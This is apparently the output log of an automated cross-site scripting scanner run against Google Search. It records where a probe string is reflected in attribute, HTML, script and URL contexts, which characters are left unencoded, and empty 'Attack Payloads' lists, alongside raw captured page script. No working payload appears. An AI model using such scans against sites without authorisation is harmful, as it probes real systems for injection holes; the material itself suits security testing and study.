e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQpwV6BAgBEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQpwV6BAgBEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQpwV6BAgBEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQpwV6BAgBEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQpwV6BAgBEBo\x22\x3ePast year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 data-ved\x3d\x222ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQpwV6BAgBEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x22site:(uvw%22xyz%27yxz%3C/zxy\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQpwV6BAgBEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [12]
+<a href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;gbv=1&amp;sei=uE2UXtD-EdGR4-EPrJehiAM">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fq%3D%26as_sitesearch%3D(uvw%2522xyz%27yxz%253C/zxy" target="_top">
+<a class="q qs" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQ_AUoAXoECAEQAw">
+<a class="q qs" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQ_AUoAnoECAEQBA">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQ_AUoAHoECAEQBg">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQ_AUoAXoECAEQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQ_AUoAnoECAEQCA">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?q%3D%26as_sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQo_oBegQIARAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?q%3D%26as_sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQo_oBegQIARAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/setprefs?safeui=on&amp;sig=0_Jls7ibeG_-grF7i-WRwcedVYBX8%3D&amp;prev=https://www.google.com/search?q%3D%26as_sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy" id="safesearch" data-ved="2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQo_oBegQIARAM">
+<a href="/advanced_search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjQuqX3puXoAhXRyDgGHaxLCDEQo_oBegQIARAN">
+<meta content="0;url=/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;gbv=1&amp;sei=uE2UXtD-EdGR4-EPrJehiAM" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	False
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.google.com/search?ie=(uvw"xyz'yxz</zxy&oe=UTF-8&q=
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.google.com/search?ie=UTF-8&oe=(uvw"xyz'yxz</zxy&q=
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.google.com/search?ie=UTF-8&oe=UTF-8&q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [3]
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value='(uvw"xyz&#39;yxz&lt;/zxy' aria-label="Search" data-ved="0ahUKEwjDvon9puXoAhXjwjgGHUjhCDUQ39UDCAk">
+<div eid="xE2UXsPMGeOF4-EPyMKjqAM" data-async-context="query:(uvw%22xyz'yxz%3C%2Fzxy" id="rso">
+<div jsdata="GXYZuf;;Bch0rs" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-iQHHpcaraNN4">
+
+----------------------------------------------------------------------------------
+HTML Context: [15]
+<title>(uvw"xyz'yxz&lt;/zxy - Google Search</title>
+<i>xyz yzx</i>
+<em>xyz</em>
+<em>xyz</em>
+<em>xyz</em>
+<em>xyz</em>
+<em>xyz</em>
+<em>xyz</em>
+<em>xyz</em>
+<em>xyz zxy</em>
+<h3 class="LC20lb DKV0Md">UVW XYZ - YouTube</h3>
+<h3 class="LC20lb DKV0Md">(xyz)(yxz)(zxy) - Tiger Algebra</h3>
+<em>XYZ</em>
+<h3 class="LC20lb DKV0Md">Rotations on the ZYX, ZXY, XYZ, XZY, YZX, YXZ axes...Assign ...</h3>
+<h3 class="med dPAwzb" style="text-align:left" aria-level="2" role="heading">Searches related to (uvw&quot;xyz&#39;yxz&lt;/zxy</h3>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="oV+U8LhG0gYEgraEhXRo3g==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[\x22\\u003Cb\\u003Eu v w colours\\u003C/b\\u003E\x22,\x22\\u003Cb\\u003Eu v w phase colours\\u003C/b\\u003E\x22,\x22\\u003Cb\\u003Eu v w phase colors uk\\u003C/b\\u003E\x22,\x22\\u003Cb\\u003Euvw full form in electrical\\u003C/b\\u003E\x22,\x22\\u003Cb\\u003Ewhat is u v w in motor\\u003C/b\\u003E\x22,\x22\\u003Cb\\u003E3 phase motor connections u v w pdf\\u003C/b\\u003E\x22,\x22\\u003Cb\\u003Eu v w dc motor\\u003C/b\\u003E\x22,\x22\\u003Cb\\u003Erst 3 phase power\\u003C/b\\u003E\x22],\x22stok\x22:\x22oMkBZZlAvZfkmTVwDtBj0NeWiUY\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","iQHHpcaraNN4","r-iQHHpcaraNN4",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['Bch0rk','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x22oMkBZZlAvZfkmTVwDtBj0NeWiUY\x22,\x22\x22,\x22xE2UXsPMGeOF4-EPyMKjqAM\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','Bch0ro','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22(uvw\\\x22xyz\x27yxz\\u003c/zxy\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n]\n,[[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003d(uvw%22xyz%27yxz%3C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','Bch0rs','[0,\x22inline\x22,2,2500,0,0]\n','Bch0rw','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586777540\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','Bch0r0','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9ztsa8tRVDX2B71zWDV523elVcwHPQw:1586777540711\x22,3]\n','Bch0r4','[1,null,null,1261,1349,0]\n'];
+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586777540419395,104383203,889774408]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"oV+U8LhG0gYEgraEhXRo3g\u003d\u003d","RpI44b":"#ebebeb","a8Umdd":"rgba(153,153,153,.4)","rZYUef":"#f5f5f5","osNyZ":"1.0","pxDH4c":"#0f9d58","v44rSc":"#70757a","GTYTQ":"#ffeb3b","ToXxme":"#e5e5e5","Vzh4p":"0px 7px 6px -5px #DFE1E5","X1bUEc":"arial,sans-serif-medium,sans-serif","abZ6pc":"#f9a825","iKzRxb":"#5f6368","eE52Jd":"#5f6368","buGAI":"16","j0DpSe":"false","JRGsye":"none","k7G1xb":"15","EJG4vf":"pointer","fRkoq":"true","HWmJg":"#dcdcdc","xeVOLe":"#689f38","tqXjO":"false","Fcb4A":"#1A73E8","U6xP0":"#4285f4","VQfWj":"#c0c0c0","SuQiSc":"1.3","V0Bluc":"none","By1ejd":"16","e2p8ee":"false","JVBnre":"false","FydCC":"true","V6eh7c":"16","qkXvHd":"500","zhBJde":"false","A2aVpb":"50","R9GQh":"#fff","EuCkcd":"16","MOPyub":"15","pDiOce":"false","TKn0F":"20px","KVmtZc":"rgba(255,255,255,.3)","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","WWz0vd":"false","ekXXzb":"13px","gir54":"0.4","prFQBe":"#ebebeb","ZzVVh":"false","zHtpPb":"false","SATNMc":"1px solid #dfe1e5","AEMHld":"#eeeeee","p7BdKe":"true","n1Whrf":"false","S7nbec":"16","aD6AQe":"#757575","KTkDB":"false","HjM8R":"#FFF","haqSDf":"rgba(0,0,0,.54)","LACYrf":"false","wku5sd":"false","ymIfqf":"18","aUt4Tc":"false","xT28q":"false","Rnt1Qc":"false","WnrBce":"rgba(0,0,0,.1)","Hzi6pf":"#DFE1E5","AwPxw":"false","QDXUyc":"#188038","j9ZYRc":"true","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","rX9Pnb":"16","kePaAc":"-4","dAFa0e":"false","wlwuHd":"false","S1ZUDf":"true","Mlljec":"false","iniaFd":"true","KD9WYe":"#1A73E8","PxA5sf":"rgba(0,0,0,.54)","SpZHZd":"true","PngPbb":"rgba(0,0,0,.87)","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","jIrJIf":"14","u4NTBb":"40","s6Rzec":"0 16px","KdGe5c":"false","sBpVac":"rgba(0,0,0,.26)","KnXmRc":"10","tpLZye":"#fff","fFepd":"-15","eo8dye":"#878787","Na6wt":"#e1e1e1","ZLr84e":"true","PYrjqe":"40","rRLesf":"0","b1KZw":"#fff","NIYCKf":"28","y1HZEd":"false","BwgO5":"16","OqjdAf":"true","kL6Xwb":"false","kvKIW":"false","ZMFELd":"false","AP8pqf":"rgba(0,0,0,.12)","fjc61":"false","EgTnfe":"true","BdVmgf":"16","X4DPRd":"true","Sgnmlc":"14px","EiEfXb":"#ebebeb","lzJv9d":"#fff","SidP2e":"rgba(248, 248, 248, 